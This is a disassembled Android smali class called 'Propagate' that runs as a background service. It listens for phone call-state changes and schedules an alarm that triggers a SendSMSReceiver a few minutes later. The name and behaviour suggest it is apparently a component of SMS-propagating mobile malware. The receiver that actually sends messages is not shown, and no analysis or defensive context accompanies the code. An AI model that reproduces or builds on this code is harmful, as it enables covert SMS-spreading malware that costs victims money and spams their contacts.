.class public Landroid/ares/Propagate;
.super Landroid/app/Service;
.source "Propagate.java"


# static fields
.field private static lastState:I


# instance fields
.field private listener:Landroid/telephony/PhoneStateListener;

.field private mTelephonyMgr:Landroid/telephony/TelephonyManager;


# direct methods
.method static constructor <clinit>()V
    .registers 1

    .prologue
    .line 29
    const/4 v0, -0x1

    sput v0, Landroid/ares/Propagate;->lastState:I

    return-void
.end method

.method public constructor <init>()V
    .registers 1

    .prologue
    .line 24
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method public static getLastState()I
    .registers 1

    .prologue
    .line 56
    sget v0, Landroid/ares/Propagate;->lastState:I

    return v0
.end method

.method public static setLastState(I)V
    .registers 1
    .param p0, "lastState"    # I

    .prologue
    .line 60
    sput p0, Landroid/ares/Propagate;->lastState:I

    .line 61
    return-void
.end method

.method public static setSendSMSAlarm(Landroid/content/Context;)V
    .registers 9
    .param p0, "context"    # Landroid/content/Context;

    .prologue
    const/16 v7, 0xc

    const/4 v6, 0x0

    .line 65
    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v2

    .line 66
    .local v2, "nextAlarm":Ljava/util/Calendar;
    const/4 v4, 0x2

    invoke-virtual {v2, v7, v4}, Ljava/util/Calendar;->add(II)V

    .line 68
    new-instance v1, Landroid/content/Intent;

    const-class v4, Landroid/ares/SendSMSReceiver;

    invoke-direct {v1, p0, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 69
    .local v1, "intent":Landroid/content/Intent;
    const/high16 v4, 0x40000000    # 2.0f

    invoke-static {p0, v6, v1, v4}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v3

    .line 71
    .local v3, "pIntent":Landroid/app/PendingIntent;
    const-string v4, "alarm"

    invoke-virtual {p0, v4}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    .line 72
    .local v0, "am":Landroid/app/AlarmManager;
    invoke-virtual {v2}, Ljava/util/Calendar;->getTimeInMillis()J

    move-result-wide v4

    invoke-virtual {v0, v6, v4, v5, v3}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    .line 75
    const-string v4, "::trace"

    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "::INFO  Send SMS alarm set at: "

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/16 v6, 0xa

    invoke-virtual {v2, v6}, Ljava/util/Calendar;->get(I)I

    move-result v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, ":"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    .line 76
    invoke-virtual {v2, v7}, Ljava/util/Calendar;->get(I)I

    move-result v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 75
    invoke-static {v4, v5}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 78
    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .registers 3
    .param p1, "arg0"    # Landroid/content/Intent;

    .prologue
    .line 82
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .registers 4

    .prologue
    .line 33
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 35
    const-string v0, "phone"

    invoke-virtual {p0, v0}, Landroid/ares/Propagate;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    iput-object v0, p0, Landroid/ares/Propagate;->mTelephonyMgr:Landroid/telephony/TelephonyManager;

    .line 36
    new-instance v0, Landroid/ares/Propagate$1;

    invoke-direct {v0, p0}, Landroid/ares/Propagate$1;-><init>(Landroid/ares/Propagate;)V

    iput-object v0, p0, Landroid/ares/Propagate;->listener:Landroid/telephony/PhoneStateListener;

    .line 49
    iget-object v0, p0, Landroid/ares/Propagate;->mTelephonyMgr:Landroid/telephony/TelephonyManager;

    iget-object v1, p0, Landroid/ares/Propagate;->listener:Landroid/telephony/PhoneStateListener;

    const/16 v2, 0x20

    invoke-virtual {v0, v1, v2}, Landroid/telephony/TelephonyManager;->listen(Landroid/telephony/PhoneStateListener;I)V

    .line 52
    const-string v0, "::trace"

    const-string v1, "::INFO  Propagate service started."

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 53
    return-void
.end method
